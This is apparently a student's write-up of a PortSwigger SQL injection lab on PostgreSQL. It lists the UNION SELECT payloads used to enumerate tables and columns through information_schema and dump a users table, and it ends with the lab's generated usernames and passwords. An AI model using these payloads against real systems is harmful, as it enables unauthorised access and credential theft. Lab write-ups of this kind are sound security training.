---
{"dg-publish":true,"permalink":"/port-swigger/all-labs/sq-li/lab5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases/","created":"2026-03-26T17:43:33.455+01:00","updated":"2026-04-07T10:23:26.420+02:00","dg-note-properties":{}}
---


## Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Objective 

 listing the database contents on non-Oracle databases
## Payload Crafting

**Postgres is Confirmed**
`"PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"`

**Payload Used**
`"'UNION SELECT version(), NULL--"`


**Payload Worked but Didnt Reflect Anything**
`" SELECT * FROM information_schema.tables"`

**Payload Drops All Table Names**
`"'UNION SELECT table_name, NULL FROM information_schema.tables--"`

![table_names_dropped.png](/img/user/Pentesting/PortSwigger_Labs/SQLi/lab5/table_names_dropped.png)

**Payload to Retrievve all Columns from *users_xxxx***
`"'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_ezngsb'--"`

![columns_dumped.png](/img/user/Pentesting/PortSwigger_Labs/SQLi/lab5/columns_dumped.png)

username column:  `"username_ccxbsg"`
password column: `"password_sprscj"`

**Payload to Dump All Users n Passwords**

`"'UNION SELECT username_ccxbsg, password_sprscj FROM users_ezngsb--"`

![admin_dumped.png](/img/user/Pentesting/PortSwigger_Labs/SQLi/lab5/admin_dumped.png)

#### Credentials
username | passwords
--------- |--------- | 
carlos | hrvjkmyabvdv1jacv3ji
wiener | ujbtnl2k7jo8e03uxwx7
administrator | h16ugisioytibea5t14w

